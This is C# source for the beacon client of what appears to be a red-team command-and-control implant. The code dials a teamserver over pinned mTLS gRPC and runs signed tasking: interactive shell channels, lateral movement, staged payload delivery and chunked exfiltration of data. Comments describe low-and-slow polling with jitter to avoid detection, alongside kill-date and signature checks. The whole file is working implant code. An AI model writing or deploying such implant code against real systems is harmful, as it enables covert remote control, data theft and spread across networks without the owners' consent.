using System.Collections.Concurrent;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;
// The generated gRPC client lives in Rod.V1.Beacon (a static client factory
// class with the nested BeaconClient). This class is also named Beacon, so alias
// the generated one to avoid the name clash.
using WireBeacon = Rod.V1.Beacon;

namespace Rod.Implant.Internal;

// The reference implant's mTLS check-in client: it opens the long-lived reverse
// Beacon.CheckIn stream, completes the handshake, and then loops reading
// downstream tasking and writing upstream results (architecture.md Sec 5/8,
// Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
// handshake/task/result messages.

/// <summary>
/// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
/// endpoint, complete the handshake, then loop dispatching downstream tasks and
/// reporting upstream results. Blocks until the cancellation token fires or the
/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
/// profile.
/// </summary>
internal sealed class Beacon
{
    // How one check-in cycle uses the stream. Stream holds the connection open
    // for the life of the session -- the interactive shape, server-push
    // tasking with no reconnect cost. Poll drains queued tasking, closes the
    // stream, and sleeps the beacon interval: the low-and-slow shape, where a
    // persistent connection would be the loudest signal an implant emits.
    // Both ride the same stream contract; only the client's use of it differs.
    private readonly string _mode;
    private readonly string _beaconUrl;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly RSA _privateKey;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    /// <summary>
    /// Builds a Beacon whose handler registry carries no enroll bundle, so the
    /// lateral.move handler reports derivation as unavailable.
    /// </summary>
    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        IReadOnlyList<string> classVerbs, TextWriter log)
        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
    {
    }

    /// <summary>
    /// Builds a Beacon with an explicit check-in mode ("stream" or "poll"; the
    /// baked profile or the -mode flag decides). See the field comment for what
    /// each mode trades.
    /// </summary>
    public Beacon(string mode, string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log)
    {
        _mode = mode;
    }

    /// <summary>
    /// Builds a Beacon whose lateral.move handler can derive a child using
    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
    /// derivation disabled. <paramref name="classVerbs"/> is the baked verb set;
    /// the advertised capability set derives from it (Sec 5.3).
    /// </summary>
    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
    {
        _mode = BeaconModes.Stream;
        _beaconUrl = beaconUrl;
        _implantId = implantId;
        _leaf = leaf;
        _privateKey = privateKey;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        // The registry carries the reference set plus whatever out-of-tree
        // handlers the build unit baked through ExtensionRegistrations (the
        // extension kit's additional seam, extending/tradecraft.md): empty in
        // the dev stub, generated per build when an extension directory is
        // configured.
        _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
        _classVerbs = classVerbs;
        _log = log;
    }

    /// <summary>
    /// Blocks until cancellation or the kill date passing. Reconnects after a
    /// jittered sleep when the stream drops (implants are connection initiators;
    /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
    /// backing off exponentially over consecutive failures so a down teamserver
    /// is not hammered at beacon rate. The kill date is checked at the top of
    /// each cycle so a long-running implant self-terminates once it passes, not
    /// only on the next restart (architecture.md Sec 7).
    /// </summary>
    public async Task RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return;
            }
            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (RpcException ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
            }

            // A handshake refusal is permanent for this artifact (retired, kill
            // date expired, unknown implant -- none of them change on a retry),
            // so the loop ends there instead of reconnecting forever.
            if (cycle == BeaconCycleResult.Terminal)
                return;

            consecutiveFailures = cycle == BeaconCycleResult.Handshaken ? 0 : consecutiveFailures + 1;
            try
            {
                await SleepWithJitterAsync(consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
        }
    }

    // What one connect-handshake-task cycle produced, driving the reconnect
    // policy in RunAsync.
    private enum BeaconCycleResult
    {
        // The cycle never reached a handshake (a transport drop); retry.
        Dropped,

        // The handshake succeeded and the stream ran; reset the failure counter.
        Handshaken,

        // The server refused the handshake permanently; the caller terminates.
        Terminal,
    }

    // One connect-handshake-task cycle. Returns how the cycle ended so the
    // caller can distinguish a transport drop (retry) from a handshake refusal
    // (permanent). Throws on transport errors, which the caller logs and
    // retries.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        var pinned = new X509Certificate2Collection();
        foreach (var ca in _cas)
            pinned.Add(ca);
        handler.SslOptions = new SslClientAuthenticationOptions
        {
            ClientCertificates = new X509Certificate2Collection(_leaf),
            RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
                C2.PinServerChain(cert as X509Certificate2, chain, pinned),
        };

        // grpc-dotnet takes the channel address; HTTPS transport security comes
        // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
        // as "host:port" (no scheme); prepend https:// so the channel builder
        // accepts it.
        var address = GrpcAddress(_beaconUrl);
        using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
        {
            HttpHandler = handler,
        });

        var client = new WireBeacon.BeaconClient(channel);
        using var call = client.CheckIn(cancellationToken: cancellationToken);

        // The implant speaks first: handshake with its protocol version and identity.
        // The advertised capability set is the baked class verbs intersected with
        // the compiled handlers (architecture.md Sec 5.3), so the teamserver only
        // ever dispatches verbs this binary can run -- never an advertised verb
        // with no handler behind it.
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
        var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (hs.Status != HandshakeStatus.Ok)
        {
            // Every non-OK handshake status (unknown implant, kill date expired,
            // retired, identity/version mismatch) is permanent for this artifact:
            // retrying would not change the answer, so terminate instead of
            // reconnecting forever.
            _log.WriteLine($"handshake refused: {hs.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");

        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
        // up. Stream mode blocks until the server closes; poll mode drains the
        // queue and ends the cycle on a short idle window (below), so the
        // implant can sleep the beacon interval instead of holding a line open.
        // A staged task (the typed arm, architecture.md Sec 10) is demanded and
        // reassembled before its handler runs -- the bulk payload arrives as a
        // chunk run, never inside the arguments string.
        //
        // The streaming task shape (architecture.md Sec 10.3) runs alongside:
        // a write gate serializes this loop and every live channel's pumps --
        // the gRPC stream allows one outstanding write -- and the live
        // channels, keyed by task id, take the ChannelInput frames the loop
        // routes to them. Both die with the stream: the finally cancels every
        // channel and waits out its pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, LiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        try
        {
            while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
            {
                var frame = call.ResponseStream.Current;

                // ChannelInput is the only kind-bearing downstream frame:
                // operator input for a live channel, routed by task id. A
                // kindless frame is the positional grammar -- a TaskRequest,
                // or a staged chunk run this implant demanded.
                if (frame.Kind == FrameKind.ChannelInput)
                {
                    RouteChannelInput(frame, liveChannels);
                    continue;
                }

                var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                // Command signing (architecture.md Sec 9): verify the teamserver's
                // signature before any handler runs. A task that fails verification
                // is reported Failed with the cause -- the operator sees the
                // rejection on the task itself -- and nothing executes.
                TaskOutcome outcome;
                string output;
                IReadOnlyList<ExfilChunk> chunks;
                if (!TaskingVerifier.Verify(_implantId, task, _cas))
                {
                    _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
                    outcome = TaskOutcome.Failed;
                    output = "task rejected: signature verification failed; not executed";
                    chunks = Array.Empty<ExfilChunk>();
                }
                else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
                {
                    // The streaming shape: the task opens a channel instead of
                    // completing inline. A poll cycle cannot host one -- its
                    // read loop ends on the idle window, and there is no
                    // downstream half to carry input -- so the refusal is
                    // reported on the task itself. On a live stream the handler
                    // runs in the background and reports its own final
                    // TaskResult; the loop keeps reading while it runs.
                    if (IsPoll)
                    {
                        _log.WriteLine($"task {task.TaskId} refused: no channel on a poll cycle");
                        await WriteFrameAsync(
                            call, writeGate,
                            ResultFrame(task, TaskOutcome.Failed,
                                "shell.interact requires a stream-mode check-in; a poll cycle carries no channel"),
                            cancellationToken);
                    }
                    else
                    {
                        StartChannel(call, writeGate, liveChannels, task, channelHandler, channelsGone.Token);
                    }
                    continue;
                }
                else if (task.HasStagedBytes)
                {
                    (outcome, output) = await RunStagedTaskAsync(call, writeGate, task, cancellationToken);
                    chunks = Array.Empty<ExfilChunk>();
                }
                else
                {
                    (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
                }

                await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), cancellationToken);

                // Out-of-band exfil chunks follow the TaskResult on the same stream.
                // Each carries the task id so the server reassembles and routes them
                // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
                foreach (var chunk in chunks)
                {
                    chunk.TaskId = task.TaskId;
                    await WriteFrameAsync(call, writeGate, new Frame
                    {
                        Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                        Kind = FrameKind.ExfilChunk,
                    }, cancellationToken);
                }
            }

            // Poll mode: the queue is drained and the idle window closed the read
            // loop -- half-close the send side and wait for the server to end the
            // stream, so every result written above is fully delivered before the
            // cycle ends and the beacon sleeps.
            if (IsPoll)
            {
                try
                {
                    await call.RequestStream.CompleteAsync();
                    while (await call.ResponseStream.MoveNext(cancellationToken))
                    {
                        // Nothing further is expected; drain until the server ends.
                    }
                }
                catch (RpcException)
                {
                    // The server tore the stream down as it processed the
                    // half-close; the results are already upstream.
                }
            }
        }
        finally
        {
            // The stream is ending: the channels are session-scoped, so they
            // end with it. The token releases the handlers (their processes
            // are killed and their pumps unwind), and the delivery waits keep
            // the call alive until every pump's last write has left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }

        return BeaconCycleResult.Handshaken;
    }

    // gRPC streams allow one outstanding write at a time; the dispatch loop
    // and every live channel's output pumps share this stream, so all of them
    // write through this gate. The token bounds the wait, not the write -- an
    // in-flight write cancels with the call itself.
    private static async ValueTask WriteFrameAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await call.RequestStream.WriteAsync(frame);
        }
        finally
        {
            writeGate.Release();
        }
    }

    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, LiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new LiveChannel(
            task.TaskId,
            (frame, ct) => WriteFrameAsync(call, writeGate, frame, ct));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(call, writeGate, liveChannels, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, LiveChannel> liveChannels,
        LiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            liveChannels.TryRemove(task.TaskId, out _);
            channel.CompleteInput();
        }
    }

    // One ChannelInput frame: operator input for a live channel, routed by
    // task id. Input for a task with no live channel is dropped and logged --
    // a channel that already ended, or input that raced the stream.
    private void RouteChannelInput(
        Frame frame,
        ConcurrentDictionary<string, LiveChannel> liveChannels)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (Google.Protobuf.InvalidProtocolBufferException)
        {
            return;
        }

        if (liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }

    // One live task channel on this stream: the input queue the loop routes
    // ChannelInput frames into, the write binding that streams output chunks
    // upstream through the stream's write gate, and the delivery task that
    // reports the handler's final TaskResult. Implements IChannelStream, so
    // the handler never touches the transport (architecture.md Sec 10.3).
    private sealed class LiveChannel : IChannelStream
    {
        // The input queue bound: operator input arrives at typing speed, and a
        // channel whose shell cannot drain it is stuck -- dropping a queued
        // keystroke is not an option, so a full queue fails the write and the
        // input is logged dropped rather than silently buffered without bound.
        private const int MaxQueuedInputs = 128;

        private readonly string _taskId;
        private readonly Func<Frame, CancellationToken, ValueTask> _writeFrame;
        private readonly System.Threading.Channels.Channel<(byte[]? Data, bool Eof)> _input =
            System.Threading.Channels.Channel.CreateBounded<(byte[]? Data, bool Eof)>(MaxQueuedInputs);

        public LiveChannel(string taskId, Func<Frame, CancellationToken, ValueTask> writeFrame)
        {
            _taskId = taskId;
            _writeFrame = writeFrame;
        }

        /// <summary>The delivery task reporting this channel's final TaskResult.</summary>
        public Task Delivery { get; set; } = Task.CompletedTask;

        public async ValueTask WriteOutputAsync(ReadOnlyMemory<byte> data, CancellationToken cancellationToken)
        {
            var output = new ChannelOutput
            {
                TaskId = _taskId,
                Data = ByteString.CopyFrom(data.Span),
            };
            await _writeFrame(
                new Frame
                {
                    Payload = ByteString.CopyFrom(output.ToByteArray()),
                    Kind = FrameKind.ChannelOutput,
                },
                cancellationToken);
        }

        public ValueTask<(byte[]? Data, bool Eof)> ReadInputAsync(CancellationToken cancellationToken)
            => _input.Reader.ReadAsync(cancellationToken);

        // Hands one routed input frame to the handler's parked read. Returns
        // false when the queue is full; the router logs the drop.
        public bool Receive(byte[] data, bool eof) => _input.Writer.TryWrite((data, eof));

        // Completes the input side so a parked read unblocks instead of
        // waiting on input that will never come.
        public void CompleteInput() => _input.Writer.TryComplete();
    }

    // How long a poll-mode read waits for the next downstream frame before
    // deciding the queue is drained. The server pushes tasking the moment it
    // is queued, so the window only needs to outlast that push; a close that
    // races a dispatch is still safe -- an unclaimed task stays queued, and a
    // task whose frame write failed is requeued server-side. Staged transfers
    // never see this window: they read on the longer deadline below.
    private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);

    // How long a staged read waits for the next chunk before giving up on the
    // transfer. An active transfer is the implant's own request in flight --
    // unlike the idle window this must not cut a run in half, so it is a
    // timeout, not a cadence: a server that cannot produce the next chunk
    // within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand the
    // payload, reassemble the chunk run the server answers with, then dispatch
    // the verb's staged handler. A transfer that ends early (stream dropped,
    // timeout, terminal chunk never arrived) is reported Failed on the task
    // itself -- the operator sees the cause where they look for the outcome.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(call, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            if (!await MoveNextStagedAsync(call.ResponseStream, cancellationToken))
            {
                _log.WriteLine($"task {task.TaskId}: staged stream ended before the terminal chunk");
                return (TaskOutcome.Failed, "staged payload stream ended before the terminal chunk");
            }

            StagedChunk chunk;
            try
            {
                chunk = StagedChunk.Parser.ParseFrom(call.ResponseStream.Current.Payload);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                return (TaskOutcome.Failed, "staged payload contained a malformed chunk");
            }
            if (chunk.TaskId != task.TaskId)
                return (TaskOutcome.Failed, "staged payload chunk carried a foreign task id");

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    // One read of a staged chunk run: stream mode blocks on the token, poll
    // mode reads on the transfer timeout instead of the idle window so an
    // in-flight run is not mistaken for a drained queue.
    private async Task<bool> MoveNextStagedAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        deadline.CancelAfter(StagedChunkTimeout);
        try
        {
            return await stream.MoveNext(deadline.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (deadline.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    private bool IsPoll => _mode == BeaconModes.Poll;

    // One read of the downstream stream: stream mode blocks on the token, poll
    // mode adds the idle window whose expiry ends the cycle.
    private async Task<bool> MoveNextFrameAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        idle.CancelAfter(PollIdleWindow);
        try
        {
            return await stream.MoveNext(idle.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    // The failure counter's doubling cap: the reconnect delay grows as
    // base * 2^failures up to 16x, keeping a down teamserver from being polled
    // at beacon rate forever.
    private const int MaxBackoffExponent = 4;

    // Sleeps for the base interval (doubled per consecutive failure, capped)
    // +/- jitter/2, honoring cancellation.
    private async Task SleepWithJitterAsync(int consecutiveFailures, CancellationToken cancellationToken)
    {
        var d = _sleep;
        for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
            d += d;
        if (_jitter > TimeSpan.Zero)
        {
            var deltaTicks = (long)(Random.Shared.NextDouble() * _jitter.Ticks) - _jitter.Ticks / 2;
            d = d + TimeSpan.FromTicks(deltaTicks);
        }
        if (d < TimeSpan.Zero)
            d = TimeSpan.Zero;
        await Task.Delay(d, cancellationToken);
    }

    // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
    // scheme is required, so "host:port" becomes "https://host:port" and an
    // explicit http:// is upgraded to https:// (the beacon channel is always
    // mTLS; a plaintext URL is a mistake, not a downgrade). Any trailing path is
    // dropped -- gRPC uses the :authority, not a path.
    private static string GrpcAddress(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        if (u.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            u = u["https://".Length..];
        else if (u.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            u = u["http://".Length..];
        var slash = u.IndexOf('/');
        if (slash >= 0)
            u = u[..slash];
        return $"https://{u}";
    }
}
